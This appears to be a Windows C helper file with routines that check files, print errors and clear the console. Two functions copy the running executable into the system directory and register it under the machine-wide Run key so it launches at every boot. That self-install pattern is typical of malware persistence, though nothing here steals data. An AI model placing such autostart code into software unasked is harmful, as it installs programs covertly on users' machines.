#include <tchar.h> // _taccess, _tprintf, _tcscat_s, _tcslen

#include "Tools.h"

#define SMALL_BUFFER_LENGTH 256

BOOL FileExist(const PTCHAR filename)
{
	int code = _taccess(filename, 0); // Checks for existence only - (mode = 0)
	if (code == 0)
		return TRUE;
	else
		switch (errno)
		{
		case EACCES:
			_tprintf(TEXT("Access denied: the file's permission setting does not allow specified access.\n"));
			break;

		case ENOENT:
			_tprintf(TEXT("File name or path not found.\n"));
			break;

		case EINVAL:
			_tprintf(TEXT("Invalid parameter.\n"));
			break;

		default:
			_tprintf(TEXT("Unknown error.\n"));
			break;
		}


	return FALSE;
}

BOOL Copy2Sysdir()
{
	HMODULE hModule = NULL;
	if(!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, NULL, &hModule))
	{
		PrintError(TEXT("GetModuleHandleEx"), GetLastError());

		return FALSE;
	}

	TCHAR filepath[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetModuleFileName(hModule, filepath, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetModuleFileName"), GetLastError());

		return FALSE;
	}

	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	errno_t code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, APP_NAME4FOLDER);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	// _tprintf(TEXT("filepath:%s, sysdir:%s\n"), filepath, sysdir);
	if(!FileExist(sysdir))
		if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS))
		{
			PrintError(TEXT("CopyFile"), GetLastError());

			return FALSE;
		}                        

	return TRUE;
}

BOOL SaveInReg()
{
	TCHAR sysdir[SMALL_BUFFER_LENGTH] = { 0 };
	if (!GetSystemDirectory(sysdir, SMALL_BUFFER_LENGTH))
	{
		PrintError(TEXT("GetSystemDirectory"), GetLastError());

		return FALSE;
	}

	errno_t code = _tcscat_s(sysdir, SMALL_BUFFER_LENGTH, APP_NAME4FOLDER);
	if (code != 0)
	{
		_tprintf(TEXT("Cannot construct sysdir path, error: %d"), code);

		return FALSE;
	}

	HKEY hKey = NULL;
	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0ul, KEY_WRITE, &hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegOpenKeyEx"), GetLastError());

		return FALSE;
	}

	if (RegSetValueEx(hKey, APP_NAME, 0ul, REG_EXPAND_SZ, (BYTE*)sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegSetValueEx"), GetLastError());
		if (RegCloseKey(hKey) != ERROR_SUCCESS)
			PrintError(TEXT("RegCloseKey"), GetLastError());

		return FALSE;
	}

	if (RegCloseKey(hKey) != ERROR_SUCCESS)
	{
		PrintError(TEXT("RegCloseKey"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

VOID PrintError(const PTCHAR msg, INT error)
{
	TCHAR sysmsg[SMALL_BUFFER_LENGTH] = { 0 };
	if (!FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), sysmsg, SMALL_BUFFER_LENGTH, NULL))
	{
		_tprintf(TEXT("[ERROR]: FormatMessage failed with 0x%x\n"), GetLastError());

		return;
	}

	PTCHAR p = sysmsg;
	while ((*p > 31) || (*p == 9))
		++p;

	do
	{
		*p-- = 0;
	} while (p >= sysmsg && (*p == '.' || *p < 33));

	_tprintf(TEXT("[ERROR]: \'%s\' failed with error %lu (%s)\n"), msg, error, sysmsg);
}

VOID ClearConsole()
{
	HANDLE                       hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	CONSOLE_SCREEN_BUFFER_INFOEX   csbiex = { 0 };
	COORD                        position = { 0,0 };
	if (GetConsoleScreenBufferInfoEx(hConsole, &csbiex))
	{
		DWORD chars_num = csbiex.dwSize.X * csbiex.dwSize.Y,
			    written = 0ul;
		FillConsoleOutputCharacter(hConsole, ' ', chars_num, position, &written);
		FillConsoleOutputAttribute(hConsole, csbiex.wAttributes, chars_num, position, &written);
	}

	SetConsoleCursorPosition(hConsole, position);
}